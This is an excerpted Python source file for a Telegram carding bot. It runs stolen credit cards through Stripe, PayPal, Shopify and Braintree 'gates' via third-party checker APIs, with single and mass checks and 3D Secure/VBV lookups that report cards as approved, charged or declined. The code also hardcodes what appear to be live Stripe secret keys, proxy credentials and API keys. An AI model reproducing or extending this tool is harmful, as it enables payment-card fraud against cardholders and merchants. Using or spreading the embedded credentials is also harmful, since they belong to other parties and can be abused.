...
OFFICIAL_GROUP_LINK = "https://t.me/wiz_x_chk"
...
AUTHORIZED_GROUP_ID = -1003222060363
...
# --- GLOBAL STATE ---
user_last_command = {}
AUTHORIZED_CHATS = set((-1003222060363,))  # Add your authorized group IDs here
...
OFFICIAL_GROUP_LINK = "https://t.me/wiz_x_chk"
DEV_LINK = "https://t.me/BLAZE_X_007"
...
def build_final_card(*, user_id: int, username: str | None, credits: int, plan: str, date_str: str, time_str: str) -> str:
    ...
    return (
        "✦━━━━━━━━━━━━━━✦\n"
       f"<pre>{bullet_link1} <b>𝑾𝒆𝒍𝒄𝒐𝒎𝒆</b> : 𝑨𝒄𝒕𝒊𝒗𝒆 ✅</pre>\n"        
        "✦━━━━━━━━━━━━━━✦\n\n"
...
def get_main_keyboard() -> InlineKeyboardMarkup:
    ...
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton(" 𝑮𝑨𝑻𝑬𝑺", callback_data="gates_menu"),
            InlineKeyboardButton(" 𝑷𝑹𝑰𝑪𝑰𝑵𝑮", callback_data="tools_menu")
        ],
        [
            InlineKeyboardButton(" 𝑶𝑾𝑵𝑬𝑹", url=DEV_LINK),
            InlineKeyboardButton(" 3𝑫𝑺 𝑳𝒐𝒐𝒌𝒖𝒑", callback_data="ds_lookup")
        ],
        [
            InlineKeyboardButton(" 𝑶𝑭𝑭𝑰𝑪𝑰𝑨𝑳 𝑮𝑹𝑶𝑼𝑷", url=OFFICIAL_GROUP_LINK)
        ]
    ])
...
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Handles the /start command, sending animated welcome messages followed by welcome photo and message.
    """
    user = update.effective_user
    logger.info(f"/start by {user.id} (@{user.username})")
    msg = update.message or update.effective_message
    # Using <i> tags
    italic_text = "<i>This is italic text</i>"

    # Individual words to show one by one (each replaces the previous)
    animation_words = [
        "⚡ 𝑾𝑬𝑳𝑪𝑶𝑴𝑬 𝑻𝑶 𝑪𝑯𝑲 𝑿 𝑾𝑰𝒁... ",
        "⚡ 𝑰𝑵𝑰𝑻𝑰𝑨𝑳𝑰𝑺𝑰𝑵𝑮 𝑩𝑶𝑻 𝑭𝑼𝑵𝑪𝑻𝑰𝑶𝑵𝑺... ",
        "⚡ 𝑬𝑺𝑻𝑨𝑩𝑳𝑰𝑺𝑯 𝑺𝑬𝑪𝑼𝑹𝑬 𝑪𝑶𝑵𝑵𝑬𝑪𝑻𝑰𝑶𝑵... ",
        "⚡ 𝑫𝑬𝑷𝑳𝑶𝒀𝑰𝑵𝑮 𝑭𝑰𝑹𝑬𝑾𝑨𝑳𝑳 𝑷𝑹𝑶𝑻𝑶𝑪𝑶𝑳... ",
        "⚡ 𝑺𝑬𝑪𝑼𝑹𝑬 𝑷𝑨𝒀𝑴𝑬𝑵𝑻 𝑮𝑨𝑻𝑬𝑾𝑨𝒀𝑺... ",
        "⚡ 𝑨𝑼𝑻𝑯𝑬𝑵𝑻𝑰𝑪𝑨𝑻𝑬 𝑼𝑺𝑬𝑹𝑺 𝑺𝑬𝑺𝑺𝑰𝑶𝑵... ",
        "⚡ 𝑺𝒀𝑺𝑻𝑬𝑴 𝑶𝑷𝑻𝑰𝑴𝑰𝑺𝑬𝑫 𝑨𝑵𝑫 𝑹𝑬𝑺𝑻𝑨𝑹𝑻𝑺 ! "
    ]

    # Send first temporary message
    temp_msg = await msg.reply_text(
        text=f"<pre>{animation_words[0]}</pre>",
        parse_mode=ParseMode.HTML
    )

    # Update message with one word at a time (each replaces the previous)
    for i in range(1, len(animation_words)):
        try:
            await context.bot.edit_message_text(
                chat_id=msg.chat_id,
                message_id=temp_msg.message_id,
                text=f"<pre>{animation_words[i]}</pre>",
                parse_mode=ParseMode.HTML
            )
            await asyncio.sleep(0.05)  # 0.05 second delay between each word
        except Exception as e:
            logger.warning(f"Failed to update animated message: {e}")
            continue

    # Wait a bit before showing final welcome message
    await asyncio.sleep(1)

    # Delete the temporary animated message
    try:
    ...
    # Proceed with original welcome message
    text, keyboard = await build_start_message(user, context)

    image_url = "https://i.ibb.co/PGkd0RpP/IMG-20251110-223501.jpg"
    try:
...
async def back_to_start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        ...
        await q.message.reply_photo(
            photo="https://i.ibb.co/PGkd0RpP/IMG-20251110-223501.jpg", # Re-send the image
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
...
async def charge_sub_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    keyboard = InlineKeyboardMarkup([
        ...
        [
            ...
            InlineKeyboardButton("💳 SK Based", callback_data="sk_gate")  
        ],
        [
...
async def razorpay_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    BULLET_GROUP_LINK = "https://t.me/wiz_x_chk"  # your clickable bullet link
    bullet_link = f"<a href='{BULLET_GROUP_LINK}'>[⊀]</a>"
...
async def sk_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    text = (
        "✦═══ 𝐒𝐊 𝐁𝐚𝐬𝐞𝐝 ═══✦\n\n"
        f"{bullet_link} 𝐂𝐌𝐃   :<code>/sk</code>\n"
        f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>SK Based</i>\n"
        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 𝐂𝐡𝐚𝐫𝐠𝐞   : <i>Normal</i>\n"
    )
...
async def shopify10_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    text = (
        ...
        f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
        f"{bullet_link} ??𝐚𝐭𝐞𝐰𝐚𝐲 : <i>Shopify</i>\n"
...
async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    handlers = {
        ...
        "sk_gate": sk_gate_handler,          # ✅ Added sk normal
...
async def background_check(cc_normalized, parts, user, user_data, processing_msg):
    ...
    try:
        ...
        final_text = (
            ...
            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝\n"
            f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <b><code>{html.escape(api_response)}</code></b>\n\n"
            f"<pre>"
            f"𝐁𝐫𝐚𝐧𝐝 ➵ {html.escape(brand)}\n"
            f"𝐁𝐚𝐧𝐤 ➵ {html.escape(issuer)}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {html.escape(country_name)} {html.escape(country_flag)}"
            f"</pre>\n\n"
            f"{bullet_link1} 𝐔𝐬𝐞𝐫 ➵ {requester}\n"
            f"{bullet_link1} 𝐃𝐄𝐕 ➵ <a href=\"tg://resolve?domain=BLAZE_X_007\">𝘽 𝙇 𝘼 𝙕 𝙀</a>\n"
...
async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
    ...
    try:
        ...
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=90) as resp:
        ...
        # Use API's elapsed time if available, otherwise calculate
        api_elapsed = data.get("elapsed", "")
        elapsed_time = api_elapsed if api_elapsed else round(time.time() - start_time, 2)

        # Map API status to appropriate display
        if status == "Charged 🔥":
            display_message = f"<b><i> {escape(message)}</i></b>"
        ...
        bullet_link1 = f"<a href='{BULLET_GROUP_LINK}'>⌬</a>"
        final_msg = (
            f"{display_message} / {escape(status)}\n\n"
            f"{bullet_link} 𝐂𝐚𝐫𝐝\n"
            f"⤷ <code>{escape(payload)}</code>\n"
            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝙋𝙖𝙮𝙥𝙖𝙡 𝟭$\n"
            f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{escape(cleaned_response)}</code></i>\n"
            f"<pre>"
            f"𝐁𝐫𝐚𝐧𝐝 ➵ {escape(brand)}\n"
            f"𝐁𝐚𝐧𝐤 ➵ {escape(issuer)}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {escape(country_name)} {country_flag}"
            f"</pre>\n"
            f"{bullet_link1} 𝐃𝐄𝐕 ➵ {developer_clickable}\n"
            f"{bullet_link1} 𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"
        )
...
API_URL_TEMPLATE = (
    "https://titanautostripeauth.onrender.com/"
    "gateway=titanautostripe/key=titanfuryy/site=dilaboards.com/cc="
)
CONCURRENCY = 3
...
BULLET_GROUP_LINK = "https://t.me/wiz_x_chk"  # replace with your link
...
CURRENT_SHOPIFY_SITE = "https://dbs838.myshopify.com"
...
DEFAULT_PROXY = "p.webshare.io:80:wmmhzcma-rotate:5is0y6atvg00"
...
async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
    ...
    try:
        ...
        # Updated API URL with proxy parameter
...
async def process_hc(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
    ...
    try:
        ...
        api_url = f"https://autosh.wuaze.com/?cc={encoded_cc}&site={encoded_site}"
...
AUTOSH_BASE = "https://autosh.arpitchk.shop/puto.php"
ST1_PROXY = "31.59.20.176:6754:glesrjme:9snocgjv0sd3"
...
async def process_oc(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
    ...
    try:
        ...
        api_url = (
            ...
            f"&cc={full_card}"
            f"&gateway=ocean"
            f"&proxy=31.59.20.176:6754:glesrjme:9snocgjv0sd3"
        )
...
DEFAULT_PROXY = "31.59.20.176:6754:glesrjme:9snocgjv0sd3"
...
# --- Config ---
SKBASED_API = "https://ravenxchecker.site/check/skb.php?sk=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&pk=pk_live_51HUYgkG623JsjE7dO3nmFeOoLlEwEAuQ6EBRzSTSuhw1sV9QlAFjjmZowOR5CrHOp3SGQdzgFCCXwQIjkwZkvJlC00uENLCy2M&amount=1"
DEFAULT_PROXY = "31.59.20.176:6754:glesrjme:9snocgjv0sd3"
...
async def process_ad(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
    """
    Process a /sk command: check SK card, display response and BIN info.
    Gateway label = SK Based, Price = 1$
    """
    import time
    start_time = time.time()
    processing_msg = None
    ...
    try:
        ...
        if len(parts) != 4:
            await update.message.reply_text(
                "❌ Invalid format.\nUse: /sk 1234567812345678|12|2028|123",
                parse_mode=ParseMode.MARKDOWN_V2
            )
            return
        ...
        # --- API request ---
        api_url = f"{SKBASED_API}&lista={full_card}"
        ...
        logger.exception("Error in processing /sk")
        try:
            if processing_msg:
                await processing_msg.edit_text(
                    f"❌ Error: <code>{escape(str(e))}</code>",
...
async def sk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if not card_input:
        await update.message.reply_text(
            "⚠️ Usage: <code>/sk card|mm|yy|cvv</code>\n"
            "Or reply to a message containing a card.",
            parse_mode=ParseMode.HTML
        )
        return
...
async def process_seturl(user, user_id, site_input, cc_input, processing_msg):
    ...
    api_url = (
        ...
        f"?site={site_input}"
        f"&cc={cc_input}"
        "&proxy=31.59.20.176:6754:glesrjme:9snocgjv0sd3"
    )
...
async def process_card_check(user, card_input, custom_urls, msg):
    ...
    performs BIN lookup, formats response in the /sk style, and edits the Telegram message.
    """
    import time
    start_time = time.time()
    try:
...
async def rsite(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    async def remove_site_bg():
        try:
            ...
            await msg.edit_text(
                "⚠️ 𝐀𝐧 ??𝐫𝐫𝐨𝐫 𝐨𝐜𝐜𝐮𝐫𝐫𝐞𝐝 𝐰𝐡𝐢𝐥?? 𝐫𝐞𝐦𝐨𝐯𝐢𝐧𝐠 𝐲𝐨𝐮𝐫 𝐬??𝐭𝐞.",
                parse_mode="HTML"
            )
...
# --- /mvbv Command ---
async def mvbv(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    ...
    if raw_text:
        matches = FLEX_CARD_REGEX.findall(raw_text)
    ...
    if not card_data_list:
        await update.message.reply_text(
            "⚠️ Usage:\n"
            "<code>/mvbv 4111111111111111|07|2027|123\n4111111111111112|08|2028|124</code>\n"
    ...
    # --- Processing message ---
    processing_text = (
        f"<pre><code>𝗠𝗮𝘀𝘀 𝗩𝗕𝗩 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴⏳</code></pre>\n"
        f"<pre><code>𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀: {len(card_data_list)}</code></pre>\n"
        f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝟯𝐃 𝗦𝗲𝗰𝘂𝗿𝗲 / 𝗩𝗕𝗩 𝗟𝗼𝗼𝗸𝘂𝗽\n"
    )
    ...
    # --- Run async Mass VBV check ---
    asyncio.create_task(run_mass_vbv_check(msg, update, card_data_list))

# --- Background worker for mass VBV check ---
async def run_mass_vbv_check(msg, update, card_data_list: list):
    """
    Check 3D Secure / VBV status for multiple cards and display BIN info.
    """
    start_time = time.time()
    results = []
    ...
    for i, card_data in enumerate(card_data_list, 1):
        try:
            ...
            results.append(f"❌ {i}. Invalid format: {card_data}")
            continue

        bin_number = cc[:6]
        api_url = f"https://api.voidapi.xyz/v2/vbv?&key=VDX-SHA2X-NZ0RS-O7HAM&card={card_data}"
        ...
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url, timeout=50) as resp:
                    if resp.status != 200:
                        results.append(f"❌ {i}. API Error (Status {resp.status})")
                        continue
                    vbv_data = await resp.json(content_type=None)
        except asyncio.TimeoutError:
            results.append(f"❌ {i}. API request failed: Timed out ⏳")
            continue
        except aiohttp.ClientConnectorError:
            results.append(f"❌ {i}. API request failed: Cannot connect 🌐")
            continue
        except aiohttp.ContentTypeError:
            results.append(f"❌ {i}. API request failed: Invalid JSON 📄")
            continue
        except Exception as e:
        ...
        result_text = (
            f"<b>{i}.</b> <code>{escaped_card}</code>\n"
    ...
    final_text = (
        f"<b><i>Mass 3D Secure / VBV Lookup</i></b>\n\n"
        f"<b>Total Cards Checked:</b> {len(card_data_list)}\n\n"
    )
...
# --- Updated API config ---
API_BASE_URL = "https://b3-349q.onrender.com"
...
async def run_braintree_check(user, cc_input: str, full_card: str, processing_msg):
    start_time = time.time()
    developer_clickable = '<a href="https://t.me/BLAZE_X_007">𝘽 𝙇 𝘼 𝙕 𝙀</a>'

    try:
        # Build API URL with your endpoint
        api_url = f"{API_BASE_URL}/key=blaze/gate=braintreeauth/cc={cc_input}"
    ...
    message_text = data.get("message", "") if isinstance(data, dict) else ""
    proxy_info = data.get("proxy", "") if isinstance(data, dict) else ""
    
    # --- If response is empty, try to get more fields from API ---
    if not response_text:
        # Try to get other possible response fields
        response_text = data.get("result", "") if isinstance(data, dict) else ""
        if not response_text:
            response_text = data.get("error", "") if isinstance(data, dict) else ""
        if not response_text:
            response_text = message_text
        if not response_text:
            # If still empty, show the entire response for debugging
            response_text = str(data) if data else "No response data"

    # --- Status mapping ---
    if status_raw in ("APPROVED", "APPROVE", "CHARGED", "OK", "SUCCESS", "LIVE", "ACTIVE"):
        header_status = "✅ Approved"
    elif status_raw in ("CCN", "CCN LIVE"):
        header_status = "❎ CCN"
    elif status_raw in ("DECLINED", "FAIL", "FAILED", "DEAD", "INVALID"):
        header_status = "❌ Declined"
    else:
        # If no clear status, determine based on response text
        response_lower = response_text.lower()
        if any(word in response_lower for word in ["approved", "success", "charged", "live"]):
            header_status = "✅ Approved"
        elif any(word in response_lower for word in ["ccn", "card number"]):
            header_status = "❎ CCN"
        else:
            header_status = "❌ Declined"
...
PAYMENT_GATEWAYS = [
    ...
    "Authorize.Net", "2Checkout", "sk", "Worldpay", "SagePay",
...
async def gate_worker(update: Update, url: str, msg, user_id: int):
    ...
    developer_clickable = "[𝘽 𝙇 𝘼 𝙕 𝙀](https://t.me/BLAZE_X_007)"
    bullet = "[⊀]"
...
async def broad(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    admin_id = 7896890222  # <-- put your Telegram user ID here
...
ADMIN_USER_ID = 7896890222  # Replace with your admin user ID
...
# 🛡️ Security
AUTHORIZED_CHATS = set([-1003222060363, -1002705705125, -1002981544233])  # Only these groups
OWNER_ID =  7896890222                    # Your Telegram user ID
...
async def block_unauthorized(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        ...
        "📩 Contact @BLAZE_X_007 to get access.\n"
        "🔗 Official group: https://t.me/wiz_x_chk"
    )
